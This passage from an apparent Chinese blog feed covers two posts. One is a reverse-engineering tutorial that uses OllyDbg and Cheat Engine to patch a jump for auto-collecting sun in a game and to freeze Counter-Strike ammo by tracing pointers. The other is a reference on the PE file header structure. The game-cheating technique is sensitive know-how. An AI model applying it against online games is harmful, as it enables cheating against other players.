title="OD逆向自动拾取阳光"><p>CE的工作到这里就结束了，接下来将游戏载入OD，定位到<code>0043A7F5</code>处，下断运行。当鼠标点击拾取阳光后，程序停在断点处。</p><img src="/posts/8ba499c5/5.2.3.png" class="" title="OD逆向自动拾取阳光"><p>在查看上面的一连串跳转指令中，发现有个jnz跳过了“增加阳光值”的操作。但给它下断运行，捡了几次阳光，都没有经过这个跳转指令，所以暂时先不管它。</p><img src="/posts/8ba499c5/5.2.5.png" class="" title="OD逆向自动拾取阳光"><p>往上拉拉发现<code>0043A7F5</code>所在的函数的功能仅仅是改变数据段中的阳光值。Ctrl + F9 执行到返回，F7 去到它的上一层函数。发现这个jnz指令有可能会绕过增加阳光值call，给它下个断点，运行几次。</p><img src="/posts/8ba499c5/5.2.4.png" class="" title="OD逆向自动拾取阳光"><p>发现阳光每往左上方移一段路程就要经过这个jnz指令，直到阳光到达指定位置才进入增加阳光值的call。</p><img src="/posts/8ba499c5/5.2.6.png" class="" title="OD逆向自动拾取阳光"><p>那这个jnz指令可以不管它，把它的断点取消。继续返回到父函数，看到有一个jnz指令可以跳到增加阳光call，下断运行。(那些call + jmp指令我们基本不会去动的，否则很容易导致程序运行出错)</p><img src="/posts/8ba499c5/5.2.7.png" class="" title="OD逆向自动拾取阳光"><p>此时阳光已经出现了，但jnz跳转没有实现，也就是还不能进入增加阳光call。</p><img src="/posts/8ba499c5/5.2.8.png" class="" title="OD逆向自动拾取阳光"><p>那怎样才能进入呢？对玩家来说，肯定是要用鼠标点击阳光才能增加阳光值。也就是触发鼠标点击阳光事件才能让jnz跳转指令实现。那我们要实现自动拾取功能，也就是鼠标不点击阳光也能使阳光值增加，怎么办？让这个jnz指令失去它的判断功能，改为无条件跳转指令jmp。</p><p>然后就会发现阳光一出现就被迅速移到指定位置，增加阳光值啦~</p><p>(注意，新手教程一定要点击一下阳光才能继续游戏)</p><h1 id="6-Cs游戏逆向分析"><a href="#6-Cs游戏逆向分析" class="headerlink" title="6. Cs游戏逆向分析"></a>6. Cs游戏逆向分析</h1><p>逆向上面几个游戏时已经学会了一点关于CE的使用方法，接下来继续利用CE逆向Cs，了解更多的CE基础用法，完成CE的入门。</p><p>Cs 1.6下载地址：<a href="https://www.cybersports.lt/">https://www.cybersports.lt/</a></p><p>进入游戏，取消全屏，设置视频为“Run in a window”，方便调试和动态分析。</p><img src="/posts/8ba499c5/6.1.1.png" class="" title="设置成窗口模式"><p>将每局的时间设置得久一点，方便调试。</p><img src="/posts/8ba499c5/6.1.4.png" class="" title="每局时间设长"><p>随机选择一幅地图开始游戏，此时子弹数为20。按下ESC键，回到桌面打开CE。</p><img src="/posts/8ba499c5/6.1.2.jpg" class="" title="游戏界面"><img src="/posts/8ba499c5/6.1.3.png" class="" title="CE首次扫描"><p>之后再怎么变化子弹的数值，CE扫描出的结果不再减少。Ctrl + A选中所有结果 -&gt; 将选中的地址添加到地址列表。</p><img src="/posts/8ba499c5/6.1.5.png" class="" title="CE扫描结果"><img src="/posts/8ba499c5/6.1.6.jpg" class="" title="添加到地址列表"><p>结合二分法，按住Shift键选中一半地址(大概就行)，右键更改记录 -&gt; 数值，假如将数值修改为80，回到游戏开一枪看子弹数量是否有变化。如果有变化表明存放子弹数量的地址就在选中其中，否则不在。删除不包含存放子弹数量地址的部分，从包含的部分继续进行二分法，以此类推，直到确定子弹数量地址。该地址为01191CAC。</p><img src="/posts/8ba499c5/6.1.7.jpg" class="" title="确定子弹数量地址"><p>当我们按Q键切换武器为匕首或其它枪时，子弹数不变，所以这个地址存储的内容应该特指手枪的子弹数。选中该条记录，在“描述”中双击修改为“手枪子弹数”进行备注。我们在游戏中发射子弹，在CE中的数值也有相应的变化。单击“描述”前面的方框，变成“×”，表示将该内存地址的数值固定，也就是射击后子弹数量不再变化，实现手枪无限子弹的目的。</p><img src="/posts/8ba499c5/6.1.8.jpg" class="" title="固定子弹数量"><p>经过进一步的试验后发现地图不同，子弹数存放的地址也不同；枪的类型不同，对应枪的子弹数的地址也不同。为什么呢？</p><img src="/posts/8ba499c5/6.1.10.png" class="" title="地图不同地址不同"><p>要想解决这个问题，先看结果中有两种颜色的地址，这是什么含义呢？</p><img src="/posts/8ba499c5/6.1.9.png" class="" title="临时存放子弹数量的地址"><ul><li><p>绿色是基址，只要程序启动，这些地址就归游戏使用；</p></li><li><p>黑色是临时申请使用的。</p></li></ul><blockquote><p>基址：不会改变，用于存放血量、金钱等。当它不够或需要存放更多数据时，它会跟系统申请地址，这个地址是系统随机分配的。所以，变换地图后显示的子弹数地址也会发生变化，我们需要找到其变化规律(偏移地址)即可。</p></blockquote><p>我们刚才找的“手枪子弹数”地址都是临时申请的地址，因此需要找到一个绿色地址，也就是找到内存地址中存放子弹且不改变的地址。</p><p>由于我们最终找到的都是黑色地址，都是临时申请的，所以程序可能使用了指针指向了临时申请的地址，而绿色地址存放的可能是指针或多层指针。</p><img src="/posts/8ba499c5/6.1.12.png" class="" title="基址存放指针"><p>按照这个思路，基址可能存放的是临时地址，即基址的值是临时地址。所以我们用CE找到数值为临时地址的地址，就很有可能是基址。</p><p>复制该地图的“手枪子弹数”地址，点击“新的扫描” -&gt; 勾选“十六进制” -&gt; 粘贴地址 -&gt; “首次扫描”。扫描结果为0，原因可能是该地址为偏移地址。比如基址从01234567开始，往后数第3个是存放子弹数量的地址，系统寻址时则表示为01234567+3，而不是直接表示0123456A。但在我们扫描数值时，给出来的地址是0123456A，不能逆推出01234567+3，所以扫描不出结果。</p><img src="/posts/8ba499c5/6.1.11.png" class="" title="结果为0"><p>右键 -&gt; 找出是什么改写了这个地址。</p><img src="/posts/8ba499c5/6.1.13.jpg" class="" title="找出是什么改写了这个地址"><p>回到游戏界面开一枪后，可以看到CE出现一条记录：</p><ul><li>计数：调用次数</li><li>指令：汇编代码</li><li>同时给出该汇编指令的上下文及当前寄存器的值</li></ul><img src="/posts/8ba499c5/6.1.14.jpg" class="" title="一条记录"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">1BA109BF - 8B CE  - mov ecx,esi</span><br><span class="line">1BA109C1 - 4D - dec ebp</span><br><span class="line">1BA109C2 - 89 AE CC000000  - mov [esi+000000CC],ebp &lt;&lt;</span><br><span class="line">1BA109C8 - D9 96 BC000000  - fst dword ptr [esi+000000BC]</span><br><span class="line">1BA109CE - D9 9E B8000000  - fstp dword ptr [esi+000000B8]</span><br><span class="line"></span><br><span class="line">EAX=00000009</span><br><span class="line">EBX=00000000</span><br><span class="line">ECX=01320EB0</span><br><span class="line">EDX=050FD0E0</span><br><span class="line">ESI=01320EB0</span><br><span class="line">EDI=06A96750</span><br><span class="line">ESP=0019F140</span><br><span class="line">EBP=00000008</span><br><span class="line">EIP=1BA109C8</span><br></pre></td></tr></table></figure><p>根据当下情况来看，原本子弹数为9，该值存储在EAX中，开一枪后的子弹数为8，存储在EBP中。将EBP的值赋给[ESI + 000000CC]，ESI=01320EB0，所以[ESI + 000000CC]=[01320EB0 + 000000CC]=[01320F7C]=8，刚好对应上我们找出来的地址和数值。</p><p>扫描十六进制数值01320EB0，找到存储该值的地址。</p><p>（由于在游戏中我“死”得太快了，所以每次都要重新找子弹数量的地址，导致图与文字描述的数值不符，问题不大，只要知道操作步骤就好）</p><img src="/posts/8ba499c5/6.1.15.png" class="" title="结果"><p>有4条结果，但都不是绿色的，都不是我们最终要找的。这4个黑色地址说明它们是存放临时数据的临时地址，其结果有可能如下图所示。</p><img src="/posts/8ba499c5/6.1.16.png" class="" title="多层指针"><p>将这4条结果添加到地址列表，依次扫描这4个地址看是否能找到绿色地址，结果4个地址扫描的结果都为0。</p><img src="/posts/8ba499c5/6.1.17.png" class="" title="结果都为0"><p>思路同上，有没有可能这4条结果也存在偏移呢？</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;现在就要跟随 &lt;a href=&quot;https://blog.csdn.net/Eastmount&quot;&gt;Eastmount&lt;/a&gt; 老师学习系统安全与恶意代码分析了，是的，终于要真正的系统地学习了~加油小凉！&lt;/p&gt;</summary>
    
    
    
    <category term="Windows逆向" scheme="http://example.com/categories/Windows%E9%80%86%E5%90%91/"/>
    
    
    <category term="逆向分析" scheme="http://example.com/tags/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>PE结构</title>
    <link href="http://example.com/posts/4dec66bb.html"/>
    <id>http://example.com/posts/4dec66bb.html</id>
    <published>2022-05-17T06:31:06.671Z</published>
    <updated>2022-07-28T14:56:44.239Z</updated>
    
    <content type="html"><![CDATA[<p>Windows逆向最基础的就是要对PE结构烂熟于心，我之前做了很多题又怎样呢，还是对PE结构一知半解，地基打不好就别梦想盖高楼。知其然知其所以然，千万不要图“快”而忽略一些重要的细节，慢就是快，这也是我这段时间悟出来的道理。</p><span id="more"></span><h1 id="1-PE的基本概念"><a href="#1-PE的基本概念" class="headerlink" title="1. PE的基本概念"></a>1. PE的基本概念</h1><p>EXE和DLL文件之间的区别完全是语义上的，因为它们使用的是完全相同的PE格式，而唯一的区别就是用一个字段标识出这个文件是EXE还是DLL。</p><p>64位Windows只是对PE格式做了一些简单的修饰，格式为PE32+，并没有任何新的结构加进去，改变的只是将32位字段扩展为64位。</p><p>PE格式的定义主要位于头文件<code>winnt.h</code>，这个头文件几乎能找到关于PE文件的所有定义。</p><p>PE文件中的数据结构一般都有32位和64位之分，一般名称上会表现出来，例如：<code>IMAGE_NT_HEADERS32</code>或<code>IMAGE_NT_HEADER64</code>。</p><img src="/posts/4dec66bb/PE%E6%96%87%E4%BB%B6%E6%A1%86%E6%9E%B6%E7%BB%93%E6%9E%84.jpg" class="" title="PE文件框架结构"><p>PE文件使用的是一个平面地址空间，所有代码和数据都合并在一起，组成一个很大的结构。文件的内容被分割为不同的区块，块中包含代码或数据。各个区块按页边界来对齐，区块没有大小限制，是一个连续的结构。此外，每个块有自己在内存中的一套属性，比如区块是否包含代码、是否只读或可读可写等。</p><p>PE文件不是作为单一内存映射文件被装入内存的。Windows加载器(又称PE装载器)遍历PE文件并决定文件的哪一部分被映射，这种映射方式是将文件较高的偏移位置映射到较高的内存地址中。当磁盘文件一旦被装入内存中，磁盘上的数据结构布局和内存中的数据结构布局是一致的。但数据之间的相对位置可能改变，其某项偏移地址可能不同于原始的偏移地址。</p><img src="/posts/4dec66bb/PE%E6%96%87%E4%BB%B6%E6%A1%86%E6%9E%B6%E7%BB%93%E6%9E%84%E5%9B%BE.png" class="" title="PE文件框架结构图"><p>由上图可以看出，文件被映射到内存，DOS文件头、PE文件头、区块表的偏移位置和大小都没有发生改变。而各区块映射到内存后，其偏移位置发生了改变。</p><p>当PE文件被Windows加载器加载到内存后，内存中的PE文件称之为模块(module)。映射文件的起始地址被称之为模块的句柄(handle)。</p><p>在Windows NT中，获取了模块的句柄相当于获取了基地址，获取了基地址相当于获取了PE结构的文件头。</p><ul><li>基地址(ImageBase)：整个PE结构中的头地址，也就是模块的句柄。可用<code>HMODULE GetModuleHandle(LPCTSTR lpModuleName);</code>去获取模块的句柄。</li><li>文件偏移地址(File Offset Address)：当PE文件存放在磁盘中，各个区块对于文件头的相对偏移地址，文件头的起始地址从0开始。</li><li>虚拟地址(Virtual Address)：PE文件映射到内存中会发生比例的变化，导致与在磁盘中的地址不一致，这个内存中的地址就是虚拟地址。</li><li>相对虚拟地址(Relative Virtual Address)：相对于基地址的偏移。</li></ul><h1 id="2-MS-DOS头部"><a href="#2-MS-DOS头部" class="headerlink" title="2. MS-DOS头部"></a>2. MS-DOS头部</h1><p>每个PE文件是以一个DOS程序开始的，有了它，一旦程序在DOS下执行，DOS才能识别出这是有效的执行体。</p><p>PE文件的第一个字节起始于一个传统的MS-DOS头部，被称作<code>IMAGE_DOS_HEADER</code>。</p><h2 id="2-1-IMAGE-DOS-HEADER"><a href="#2-1-IMAGE-DOS-HEADER" class="headerlink" title="2.1 IMAGE_DOS_HEADER"></a>2.1 IMAGE_DOS_HEADER</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">IMAGE_DOS_HEADER STRUCT </span><br><span class="line">&#123; </span><br><span class="line">    +<span class="number">00</span>h WORD e_magic      <span class="comment">// Magic DOS signature MZ(4Dh 5Ah)  DOS可执行文件标志</span></span><br><span class="line">    +<span class="number">02</span>h WORD e_cblp      <span class="comment">// Bytes on last page of file   </span></span><br><span class="line">    +<span class="number">04</span>h WORD e_cp       <span class="comment">// Pages in file</span></span><br><span class="line">    +<span class="number">06</span>h WORD e_crlc       <span class="comment">// Relocations</span></span><br><span class="line">    +<span class="number">08</span>h WORD e_cparhdr    <span class="comment">// Size of header in paragraphs</span></span><br><span class="line">    +<span class="number">0</span>ah WORD e_minalloc   <span class="comment">// Minimun extra paragraphs needs</span></span><br><span class="line">    +<span class="number">0</span>ch WORD e_maxalloc <span class="comment">// Maximun extra paragraphs needs</span></span><br><span class="line">    +<span class="number">0</span>eh WORD e_ss         <span class="comment">// intial(relative)SS value     DOS代码的初始化堆栈SS </span></span><br><span class="line">    +<span class="number">10</span>h WORD e_sp         <span class="comment">// intial SP value     DOS代码的初始化堆栈指针SP </span></span><br><span class="line">    +<span class="number">12</span>h WORD e_csum       <span class="comment">// Checksum </span></span><br><span class="line">    +<span class="number">14</span>h WORD e_ip        <span class="comment">// intial IP value  DOS代码的初始化指令入口[指针IP] </span></span><br><span class="line">    +<span class="number">16</span>h WORD e_cs         <span class="comment">// intial(relative)CS value    DOS代码的初始堆栈入口 </span></span><br><span class="line">    +<span class="number">18</span>h WORD e_lfarlc     <span class="comment">// File Address of relocation table </span></span><br><span class="line">    +<span class="number">1</span>ah WORD e_ovno      <span class="comment">//   Overlay number </span></span><br><span class="line">    +<span class="number">1</span>ch WORD e_res[<span class="number">4</span>]     <span class="comment">// Reserved words </span></span><br><span class="line">    +<span class="number">24</span>h WORD e_oemid      <span class="comment">//   OEM identifier(for e_oeminfo) </span></span><br><span class="line">    +<span class="number">26</span>h WORD e_oeminfo   <span class="comment">//  OEM information;e_oemid specific  </span></span><br><span class="line">    +<span class="number">29</span>h WORD e_res2[<span class="number">10</span>]   <span class="comment">//  Reserved words </span></span><br><span class="line">    +<span class="number">3</span>ch DWORD e_lfanew    <span class="comment">// Offset to start of PE header  指向PE文件头</span></span><br><span class="line">&#125;IMAGE_DOS_HEADER ENDS</span><br></pre></td></tr></table></figure><p>两个重要字段：</p><ul><li>e_magic：必须为MZ(4D 5A)开头，大小为2个字节。</li><li>e_lfanew：PE文件头的起始偏移地址，大小为4个字节。</li></ul><p>DOS头后跟一个DOS stub数据，是链接器链接执行文件的时候加入的部分数据，一般是“This program must be run under Microsoft Windows”。这个可以通过修改链接器的设置来修改成自己定义的数据。</p><h1 id="3-PE文件头"><a href="#3-PE文件头" class="headerlink" title="3. PE文件头"></a>3. PE文件头</h1><p>紧跟着DOS stub的是PE头文件(PE Header)。PE Header是PE相关结构NT映像头(<code>IMAGE_NT_HEADER</code>)的简称，其中包含许多PE装载器用到的重要字段。执行体在支持PE文件结构的操作系统中执行时，PE装载器将从<code>IMAGE_DOS_HEADER</code>结构中的<code>e_lfanew</code>字段里找到PE Header的起始偏移量，加上基地址得到PE文件头的指针。</p><script type="math/tex; mode=display">PNTHeader = ImageBase + (dosHeader\to e\_lfanew)</script><p>PE头的数据结构被定义为<code>IMAGE_NT_HEADERS</code>。</p><h2 id="3-1-IMAGE-NT-HEADERS"><a href="#3-1-IMAGE-NT-HEADERS" class="headerlink" title="3.1 IMAGE_NT_HEADERS"></a>3.1 IMAGE_NT_HEADERS</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">IMAGE_NT_HEADERS STRUCT</span><br><span class="line">&#123;</span><br><span class="line">  +<span class="number">0</span>h     DWORD Signature</span><br><span class="line">  +<span class="number">4</span>h     IMAGE_FILE_HEADER FileHeader</span><br><span class="line">  +<span class="number">18</span>h    IMAGE_OPTIONAL_HEADER32 OptionalHeader</span><br><span class="line">&#125;IMAGE_NT_HEADERS ENDS</span><br></pre></td></tr></table></figure><ul><li>Signature：在一个有效的PE文件里，被设置为00004550h，也就是“PE..”，标志这是PE文件头的开始。</li><li>FileHeader：映像头文件结构包含了文件的物理层信息及文件属性，占20字节。</li><li>OptionalHeader：可选映像头是一个可选的结构，实际上<code>IMAGE_FILE_HEADER</code>结构不足以定义PE文件属性，因此可选映像头中定义了更多的数据。总共224个字节，最后128个字节为数据目录(Data Directory)。</li></ul><h2 id="3-2-IMAGE-FILE-HEADER"><a href="#3-2-IMAGE-FILE-HEADER" class="headerlink" title="3.2 IMAGE_FILE_HEADER"></a>3.2 IMAGE_FILE_HEADER</h2><p>从“+4h”开始是相对于<code>IMAGE_NT_HEADERS</code>结构中的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_FILE_HEADER</span> &#123;</span></span><br><span class="line">  +<span class="number">4</span>h   WORD    Machine;<span class="comment">//运行平台</span></span><br><span class="line">  +<span class="number">6</span>h   WORD    NumberOfSections;<span class="comment">//文件的区块数目</span></span><br><span class="line">  +<span class="number">8</span>h   DWORD   TimeDateStamp;<span class="comment">//文件创建日期和时间</span></span><br><span class="line">  +<span class="number">0</span>Ch  DWORD   PointerToSymbolTable;<span class="comment">//指向符号表（用于调试）</span></span><br><span class="line">  +<span class="number">10</span>h  DWORD   NumberOfSymbols;<span class="comment">//符号表中符号个数（用于调试）</span></span><br><span class="line">  +<span class="number">14</span>h  WORD    SizeOfOptionalHeader;<span class="comment">//IMAGE_OPTIONAL_HEADER32结构大小</span></span><br><span class="line">  +<span class="number">16</span>h  WORD    Characteristics;<span class="comment">//文件属性</span></span><br><span class="line">&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;</span><br></pre></td></tr></table></figure><ul><li>Machine：可执行文件的目标CPU类型。</li></ul><div class="table-container"><table><thead><tr><th>Value</th><th>Meaning</th></tr></thead><tbody><tr><td>IMAGE_FILE_MACHINE_I386<br />0x014c</td><td>x86</td></tr><tr><td>IMAGE_FILE_MACHINE_IA64<br />0x0200</td><td>Intel Itanium</td></tr><tr><td>IMAGE_FILE_MACHINE_AMD64<br />0x8664</td><td>x64</td></tr></tbody></table></div><ul><li><p>NumberOfSections：区块的数目。(区块表是紧跟在<code>IMAGE_NT_HEADERS</code>后面的)</p></li><li><p>TimeDataStamp：表明文件是何时被创建的。这个值是自1970-1-1以来用格林威治时间计算的秒数。</p></li><li><p>PointerToSymbolTable：COFF符号表的文件偏移位置，现在基本没用了。</p></li><li><p>NumberOfSymbols：如果有COFF符号表，它代表其中的符号数目，COFF符号是一个大小固定的结构，如果想找到COFF符号表的结束位置，则需要这个变量。</p></li><li><p>SizeOfOptionalHeader：紧跟着<code>IMAGE_FILE_HEADER</code>后面的数据结构(<code>IMAGE_OPTIONAL_HEADER</code>)的大小。对于32位PE文件，这个值通常为00E0h，对于64位，值为00F0h。</p></li><li><p>Characteristics：文件属性，有选择地通过几个值可以运算得到。这些标志的有效值是定义于<code>winnt.h</code>内的<code>IMAGE_FILE_xxx</code>的值，具体含义见下表。普通EXE文件的字段值一般为0100h，DLL文件值为210Eh。多种属性可通过“或运算”同时拥有。</p></li></ul><div class="table-container"><table><thead><tr><th>Value</th><th>Meaning</th></tr></thead><tbody><tr><td>IMAGE_FILE_RELOCS_STRIPPED<br/>0x0001</td><td>Relocation information was stripped from the file. The file must be loaded at its preferredbase address. If the base address is notavailable, the loader reports an error.</td></tr><tr><td>IMAGE_FILE_EXECUTABLE_IMAGE<br/>0x0002</td><td>The file is executable (there are no unresolved external references).</td></tr><tr><td>IMAGE_FILE_LINE_NUMS_STRIPPED<br/>0x0004</td><td>COFF line numbers were stripped from the file.</td></tr><tr><td>IMAGE_FILE_LOCAL_SYMS_STRIPPED<br/>0x0008</td><td>COFF symbol table entries were stripped from file.</td></tr><tr><td>IMAGE_FILE_AGGRESIVE_WS_TRIM<br/>0x0010</td><td>Aggressively trim the working set. This value is obsolete as of Windows 2000.</td></tr><tr><td>IMAGE_FILE_LARGE_ADDRESS_AWARE<br/>0x0020</td><td>The application can handle addresses larger than 2 GB.</td></tr><tr><td>IMAGE_FILE_BYTES_REVERSED_LO<br/>0x0080</td><td>The bytes of the word are reversed. This flag is obsolete.</td></tr><tr><td>IMAGE_FILE_32BIT_MACHINE<br/>0x0100</td><td>The computer supports 32-bit words.</td></tr><tr><td>IMAGE_FILE_DEBUG_STRIPPED<br/>0x0200</td><td>Debugging information was removed and stored separately in another file.</td></tr><tr><td>IMAGE_FILE_REMOVABLE_RUN_FROM_SWAP<br/>0x0400</td><td>If the image is on removable media, copy it toand run it from the swap file.</td></tr><tr><td>IMAGE_FILE_NET_RUN_FROM_SWAP<br/>0x0800</td><td>If the image is on the network, copy it to and run it from the swap file.</td></tr><tr><td>IMAGE_FILE_SYSTEM<br/>0x1000</td><td>The image is a system file.</td></tr><tr><td>IMAGE_FILE_DLL<br/>0x2000</td><td>The image is a DLL file. While it is an executable file, it cannot be run directly.</td></tr><tr><td>IMAGE_FILE_UP_SYSTEM_ONLY<br/>0x4000</td><td>The file should be run only on a uniprocessor computer.</td></tr><tr><td>IMAGE_FILE_BYTES_REVERSED_HI<br/>0x8000</td><td>The bytes of the word are reversed. This flag is obsolete.</td></tr></tbody></table></div><h2 id="3-3-IMAGE-OPTIONAL-HEADER32"><a href="#3-3-IMAGE-OPTIONAL-HEADER32" class="headerlink" title="3.3 IMAGE_OPTIONAL_HEADER32"></a>3.3 IMAGE_OPTIONAL_HEADER32</h2><p>从“+18h”是相对于<code>IMAGE_NT_HEADERS</code>结构中的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER</span> &#123;</span></span><br><span class="line">  +<span class="number">18</span>h  WORD    Magic;<span class="comment">//标志字</span></span><br><span class="line">  +<span class="number">1</span>Ah  BYTE    MajorLinkerVersion;<span class="comment">//链接器主版本号</span></span><br><span class="line">  +<span class="number">1B</span>h  BYTE    MinorLinkerVersion;<span class="comment">//链接器次版本号</span></span><br><span class="line">  +<span class="number">1</span>Ch  DWORD   SizeOfCode;<span class="comment">//所有含有代码表的总大小</span></span><br><span class="line">  +<span class="number">20</span>h  DWORD   SizeOfInitializedData;<span class="comment">//所有初始化数据表总大小</span></span><br><span class="line">  +<span class="number">24</span>h  DWORD   SizeOfUninitializedData;<span class="comment">//所有未初始化数据表总大小</span></span><br><span class="line">  +<span class="number">28</span>h  DWORD   AddressOfEntryPoint;<span class="comment">//程序执行入口RVA【重要】</span></span><br><span class="line">  +<span class="number">2</span>Ch  DWORD   BaseOfCode;<span class="comment">//代码表起始RVA</span></span><br><span class="line">  +<span class="number">30</span>h  DWORD   BaseOfData;<span class="comment">//数据表起始RVA</span></span><br><span class="line">    <span class="comment">//以下属于NT结构增加的领域</span></span><br><span class="line">  +<span class="number">34</span>h  DWORD   ImageBase;<span class="comment">//程序默认装入基地址【重要】</span></span><br><span class="line">  +<span class="number">38</span>h  DWORD   SectionAlignment;<span class="comment">//内存中表的对齐大小【重要】</span></span><br><span class="line">  +<span class="number">3</span>Ch  DWORD   FileAlignment;<span class="comment">//文件中表的对齐大小【重要】</span></span><br><span class="line">  +<span class="number">40</span>h  WORD    MajorOperatingSystemVersion;<span class="comment">//操作系统主版本号</span></span><br><span class="line">  +<span class="number">42</span>h  WORD    MinorOperatingSystemVersion;<span class="comment">//操作系统次版本号</span></span><br><span class="line">  +<span class="number">44</span>h  WORD    MajorImageVersion;<span class="comment">//用户自定义主版本号</span></span><br><span class="line">  +<span class="number">46</span>h  WORD    MinorImageVersion;<span class="comment">//用户自定义次版本号</span></span><br><span class="line">  +<span class="number">48</span>h  WORD    MajorSubsystemVersion;<span class="comment">//所需要子系统主版本号</span></span><br><span class="line">  +<span class="number">4</span>Ah  WORD    MinorSubsystemVersion;<span class="comment">//所需要子系统次版本号</span></span><br><span class="line">  +<span class="number">4</span>Ch  DWORD   Win32VersionValue;<span class="comment">//保留，通常设置为0</span></span><br><span class="line">  +<span class="number">50</span>h  DWORD   SizeOfImage;<span class="comment">//映像装入内存后的总大小</span></span><br><span class="line">  +<span class="number">54</span>h  DWORD   SizeOfHeaders;<span class="comment">//DOS头、PE头、区块表总大小</span></span><br><span class="line">  +<span class="number">58</span>h  DWORD   CheckSum;<span class="comment">//映像校验和</span></span><br><span class="line">  +<span class="number">5</span>Ch  WORD    Subsystem;<span class="comment">//可执行文件期望的子系统【重要】</span></span><br><span class="line">  +<span class="number">5</span>Eh  WORD    DllCharacteristics;<span class="comment">//显示DLL特性的旗标</span></span><br><span class="line">  +<span class="number">60</span>h  DWORD   SizeOfStackReserve;<span class="comment">//初始化堆栈大小</span></span><br><span class="line">  +<span class="number">64</span>h  DWORD   SizeOfStackCommit;<span class="comment">//初始化实际提交堆栈大小</span></span><br><span class="line">  +<span class="number">68</span>h  DWORD   SizeOfHeapReserve;<span class="comment">//初始化保留堆栈大小</span></span><br><span class="line">  +<span class="number">6</span>Ch  DWORD   SizeOfHeapCommit;<span class="comment">//初始化实际保留堆栈大小</span></span><br><span class="line">  +<span class="number">70</span>h  DWORD   LoaderFlags;<span class="comment">//与调试相关，默认值为0</span></span><br><span class="line">  +<span class="number">74</span>h  DWORD   NumberOfRvaAndSizes;<span class="comment">//数据目录表的项数(总是16)</span></span><br><span class="line">  +<span class="number">78</span>h  IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];<span class="comment">//数据目录表【重要】</span></span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br></pre></td></tr></table></figure><p>事实上，这个结构中的大部分字段都不重要，但有些病毒恰恰利用这些字段做手脚。</p><ul><li><p>AddressOfEntryPoint：文件被执行时的入口地址，这是一个RVA地址。如果在一个可执行文件上附加了一段代码并想让这段代码首先被执行，那么只需要将这个入口地址指向附加的代码即可。</p></li><li><p>ImageBase：文件的优先装入地址。文件被执行时，如果可能的话，Windows优先将文件装入到由<code>ImageBase</code>字段指定的地址中，只有指定的地址已经被其它模块使用时，文件才被装入到其它地址中。链接器产生可执行文件的时候对应这个地址来生成机器码，所以当文件被装入这个地址时不需要进行重定位操作，装入的速度最快，如果文件被装载到其它地址的话，将不得不进行重定位操作，这样就要慢一点。</p><p>对于EXE文件来说，由于每个文件总是使用独立的虚拟地址空间，优先装入地址不可能被其它模块占据，所以EXE总是能够按照这个地址装入，这也意味着EXE文件不再需要重定位信息。</p><p>对于DLL文件来说，由于多个DLL文件全部使用宿主EXE文件的地址空间，不能保证优先装入地址没有被其它的DLL使用，所以DLL文件中必须包含重定位信息以防万一。因此，在前面介绍的<code>IMAGE_FILE_HEADER</code>结构的<code>Characteristics</code>字段中，DLL文件对应的<code>IMAGE_FILE_RELOCS_STRIPPED</code>位总是为0，而EXE文件的这个标志位总是为1。</p><p>在链接的时候，可以通过对<code>link.exe</code>指定<code>/base:address</code>选项来自定义优先装入地址，如果不指定这个选项的话，一般EXE文件的默认优先装入地址被定为00400000h，而DLL文件的默认优先装入地址被定为10000000h。</p></li><li><p>SectionAlignment和FileAlignment：<code>SectionAlignment</code>字段指定了节被装入内存后的对齐单位。也就是说，每个节被装入的地址必定是本字段指定数值的整数倍。在内存中对齐默认以1000h为单位。而<code>FileAlignment</code>字段指定了节存储在磁盘文件中时的对齐单位。在磁盘中对齐默认以200h为单位。</p><p>在64位下内存对齐以2000h为单位，如果32位程序想在64位系统下实现兼容，将<code>SectionAlignment</code>值设为2000h即可。</p></li><li><p>Subsystem：指定使用界面